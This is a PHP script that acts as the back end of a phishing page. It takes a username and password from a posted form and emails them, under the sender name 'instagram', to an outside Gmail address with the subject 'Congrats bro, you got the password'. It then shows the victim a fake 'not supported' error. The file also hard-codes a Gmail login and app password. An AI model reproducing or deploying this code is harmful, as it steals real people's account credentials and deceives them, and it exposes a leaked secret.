<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if(isset($_POST['send']))
{
  $username = $_POST['first'];
  $password = $_POST['second'];

  //Load Composer's autoloader
  require 'PHPMailer/Exception.php';
  require 'PHPMailer/PHPMailer.php';
  require 'PHPMailer/SMTP.php';

  //Create an instance; passing `true` enables exceptions
  $mail = new PHPMailer(true);

  try {
      //Server settings
      $mail->isSMTP();                                            //Send using SMTP
      $mail->Host       = 'smtp.gmail.com';                       //Set the SMTP server to send through
      $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
      $mail->Username   = 'ak5291915@gmail.com';                  //SMTP username
      $mail->Password   = 'yipdesqdyokdigib';                     //SMTP password
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
      $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

      //Recipients
      $mail->setFrom('ak5291915@gmail.com', 'instagram');
      $mail->addAddress('randompatna@gmail.com', 'Random Patna'); //Add a recipient

      //Content
      $mail->isHTML(true);                                        //Set email format to HTML
      $mail->Subject = 'Congrats bro, you got the password';
      $mail->Body    = "Username - $username <br> Password - $password";

      $mail->send();
      echo "<div style='width:400px; text-align:center; position:absolute; top:30px; left:50%; transform: translateX(-50%); color: black; padding: 8px 0;' class='success'>This username or password is not supported</div>";
  } catch (Exception $e) {
    echo "<div style='width:400px; text-align:center; position:absolute; top:30px; left:50%; transform: translateX(-50%); color: black; padding: 8px 0;' class='success'>error</div>";
  }
}
?>
